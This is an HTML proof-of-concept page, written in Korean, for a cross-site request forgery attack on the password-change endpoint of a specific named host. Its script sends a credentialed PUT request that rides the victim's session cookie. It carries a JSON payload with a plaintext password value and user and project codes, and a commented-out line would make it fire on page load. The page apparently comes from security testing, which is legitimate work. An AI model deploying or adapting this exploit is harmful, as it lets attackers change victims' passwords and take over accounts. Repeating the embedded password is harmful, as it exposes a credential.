<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC - Password Change</title>
  <meta charset="utf-8">
</head>
<body>
  <h2>CSRF 테스트 페이지</h2>
  <p>아래 버튼을 클릭하면 비밀번호 변경 요청이 백그라운드에서 전송됩니다.</p>

  <button onclick="exploit()">비밀번호 변경 실행 (CSRF)</button>

  <script>
    function exploit() {
      const xhr = new XMLHttpRequest();
      
      xhr.open("PUT", "https://omni.skshieldus.com:8443/user/password", true);
      
      // 필요한 헤더 설정
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
      xhr.setRequestHeader("Origin", "https://omni.skshieldus.com:8443");
      xhr.setRequestHeader("Referer", "https://omni.skshieldus.com:8443/user/pwdChg?frmId=4ac72df1-bb6a-412d-9b31-7e17b16f13bc&popType=M&menuCd=14736");

      // withCredentials = true → 쿠키(JSESSIONID) 자동 전송
      xhr.withCredentials = true;

      // 전송할 JSON 페이로드
      const payload = {
        "progPh": "/user/pwdChg",
        "actNm": "비밀번호변경",
        "userCd": "6000",
        "projCd": "ISAC",
        "userPs": "wlseks2025!@",
        "newUserPs": "wlseks2025!@",
        "chkUserPs": "wlseks2025!@"
      };

      xhr.send(JSON.stringify(payload));

      xhr.onload = function() {
        if (xhr.status === 200) {
          alert("CSRF 성공: 비밀번호가 변경되었습니다!");
        } else {
          alert("실패: " + xhr.status + " - " + xhr.responseText);
        }
      };
    }

    // 자동 실행 (테스트용 - 필요시 주석 처리)
    // window.onload = exploit;
  </script>

  <hr>
  <small>이 페이지는 CSRF 취약점 테스트용 PoC입니다. <br>
  <b>주의</b>: JSESSIONID 쿠키가 유효한 상태에서 실행되어야 동작합니다.</small>
</body>
</html>
